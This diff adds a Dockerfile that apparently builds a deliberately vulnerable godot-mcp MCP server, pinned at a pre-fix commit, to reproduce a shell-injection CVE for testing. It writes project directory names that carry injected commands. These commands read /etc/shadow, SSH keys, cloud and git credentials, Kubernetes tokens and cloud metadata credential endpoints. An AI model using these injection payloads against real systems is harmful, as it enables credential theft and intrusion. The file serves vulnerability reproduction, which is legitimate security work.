@@ -1,0 +1,80 @@
+# Vulnerable @coding-solo/godot-mcp, built from the real source at the pre-fix commit 90b907a
+# (package version 0.1.0; executeOperation still interpolates projectPath into an exec() shell
+# string). Real npm install from the public registry; no reimplementation of the server.
+FROM node:20-alpine
+
+RUN apk add --no-cache git
+
+WORKDIR /app
+RUN git clone https://github.com/Coding-Solo/godot-mcp.git . \
+ && git checkout 90b907a
+RUN npm install && npm run build
+
+# Benign Godot adapter + injection-carrying project fixtures (see bake_projects.mjs). Baked inline
+# rather than COPYed so the Dockerfile fingerprint covers the stub and the fixtures' content.
+RUN cat > /usr/local/bin/godot <<'GODOT_STUB_EOF'
+#!/bin/sh
+# Benign Godot adapter (the sole Godot dependency the kit stands in for). The CVE lives in the
+# real server's executeOperation shell-string construction, not here: this stub only has to pass
+# the server's `<godot> --version` validation and exit cleanly for a headless run so the injected
+# command (appended to the shell line) is what produces output.
+if [ "$1" = "--version" ]; then
+  echo "4.4.1.stable.official"
+  exit 0
+fi
+exit 0
+GODOT_STUB_EOF
+RUN chmod +x /usr/local/bin/godot
+RUN cat > /tmp/exploit_projects.json <<'EXPLOIT_PROJECTS_EOF'
+[
+  {"place_id": "process-account-identity", "cmd": "whoami"},
+  {"place_id": "etc-shadow", "cmd": "cat /etc/shadow"},
+  {"place_id": "container-hostname", "cmd": "hostname"},
+  {"place_id": "aws-credentials", "cmd": "cat /tmp/.aws/credentials"},
+  {"place_id": "gcloud-adc", "cmd": "cat /tmp/.config/gcloud/application_default_credentials.json"},
+  {"place_id": "azure-profile", "cmd": "cat /tmp/.azure/azureProfile.json"},
+  {"place_id": "ssh-private-key", "cmd": "cat /tmp/.ssh/id_rsa"},
+  {"place_id": "shell-history", "cmd": "cat /tmp/.bash_history"},
+  {"place_id": "git-credentials", "cmd": "cat /tmp/.git-credentials"},
+  {"place_id": "npmrc", "cmd": "cat /tmp/.npmrc"},
+  {"place_id": "gh-hosts", "cmd": "cat /tmp/.config/gh/hosts.yml"},
+  {"place_id": "docker-config", "cmd": "cat /tmp/.docker/config.json"},
+  {"place_id": "kube-config", "cmd": "cat /tmp/.kube/config"},
+  {"place_id": "pgpass", "cmd": "cat /tmp/.pgpass"},
+  {"place_id": "mysql-client-cnf", "cmd": "cat /tmp/.my.cnf"},
+  {"place_id": "mongorc", "cmd": "cat /tmp/.mongorc.js"},
+  {"place_id": "mysql-system-cnf", "cmd": "cat /etc/mysql/my.cnf"},
+  {"place_id": "proc-environ", "cmd": "printenv MCP_UPSTREAM_SECRET"},
+  {"place_id": "run-secrets", "cmd": "cat /run/secrets/db_password"},
+  {"place_id": "k8s-sa-token", "cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
+  {"place_id": "imds", "cmd": "wget -qO- -T 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
+  {"place_id": "ecs-task-credentials", "cmd": "wget -qO- -T 5 http://169.254.170.2/v2/credentials/"},
+  {"place_id": "eks-pod-identity", "cmd": "wget -qO- -T 5 http://169.254.170.23/v1/credentials"},
+  {"place_id": "etc-hosts", "cmd": "cat /etc/hosts"},
+  {"place_id": "auth-log", "cmd": "cat /var/log/auth.log"}
+]
+EXPLOIT_PROJECTS_EOF
+RUN cat > /tmp/bake_projects.mjs <<'BAKE_PROJECTS_EOF'
+// Bakes one real Godot project directory per exploit place, whose directory name
+// embeds a shell-injection payload in projectPath. The vulnerable server guards every
+// executeOperation handler with existsSync(join(projectPath, 'project.godot')); the baked
+// project makes that guard pass while projectPath still carries the injection. The exploit
+// (kit_fixture.py) derives the identical projectPath string, so bake and exploit cannot drift.
+import fs from 'fs';
+import path from 'path';
+
+const specs = JSON.parse(fs.readFileSync(process.argv[2], 'utf8'));
+const projectFile = (placeId, cmd) =>
+  path.join(`/p/${placeId}";${cmd};"`, 'project.godot');
+
+for (const { place_id, cmd } of specs) {
+  const file = projectFile(place_id, cmd);
+  fs.mkdirSync(path.dirname(file), { recursive: true });
+  fs.writeFileSync(file, '[application]\nconfig/name="calib"\nconfig/features=PackedStringArray("4.4")\n');
+}
+console.log(`baked ${specs.length} injection projects`);
+BAKE_PROJECTS_EOF
+RUN node /tmp/bake_projects.mjs /tmp/exploit_projects.json
+
+ENV GODOT_PATH=/usr/local/bin/godot
+ENTRYPOINT ["node", "/app/build/index.js"]
